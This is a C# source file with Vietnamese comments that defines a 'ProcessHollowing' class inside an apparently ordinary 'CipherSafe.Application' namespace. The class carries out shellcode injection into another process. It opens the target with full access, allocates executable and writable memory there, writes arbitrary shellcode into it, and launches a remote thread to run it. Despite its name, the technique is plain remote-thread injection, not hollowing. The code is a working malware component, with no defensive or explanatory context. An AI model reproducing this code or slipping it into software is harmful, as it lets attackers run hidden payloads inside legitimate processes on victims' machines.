using System.Runtime.InteropServices;

namespace CipherSafe.Application;
internal class ProcessHollowing
{
    // Khai báo các hằng số cho quyền truy cập và bảo vệ bộ nhớ
    private const int PAGE_EXECUTE_READWRITE = 0x40; // Quyền cho phép thực thi và ghi vào bộ nhớ
    private const int PROCESS_ALL_ACCESS = 0x1F0FFF; // Quyền truy cập đầy đủ vào tiến trình

    // Khai báo các phương thức API từ kernel32.dll
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    // Biến lưu trữ ID tiến trình mục tiêu và mã shellcode
    private int targetProcessId; // ID của tiến trình mà chúng ta sẽ thao tác
    private byte[] shellcode; // Mã shellcode để chạy trong tiến trình

    // Constructor nhận vào ID tiến trình và mã shellcode
    public ProcessHollowing(int targetProcessId, byte[] shellcode)
    {
        this.targetProcessId = targetProcessId;
        this.shellcode = shellcode;
    }

    // Phương thức thực hiện Process Hollowing
    public void Execute()
    {
        // Mở tiến trình mục tiêu với quyền truy cập đầy đủ
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
        if (hProcess == IntPtr.Zero)
        {
            throw new Exception("Could not open target process."); // Lỗi nếu không mở được tiến trình
        }

        // Cấp phát bộ nhớ trong tiến trình mục tiêu cho shellcode
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000 | 0x2000, PAGE_EXECUTE_READWRITE);
        if (allocMemAddress == IntPtr.Zero)
        {
            CloseHandle(hProcess);
            throw new Exception("Could not allocate memory in target process."); // Lỗi nếu không cấp phát bộ nhớ
        }

        // Ghi shellcode vào bộ nhớ đã cấp phát
        if (!WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out _))
        {
            CloseHandle(hProcess);
            throw new Exception("Could not write to target process memory."); // Lỗi nếu không ghi được vào bộ nhớ
        }

        // Tạo một luồng từ xa trong tiến trình mục tiêu để thực thi shellcode
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out _);
        CloseHandle(hProcess); // Đóng handle của tiến trình
    }
}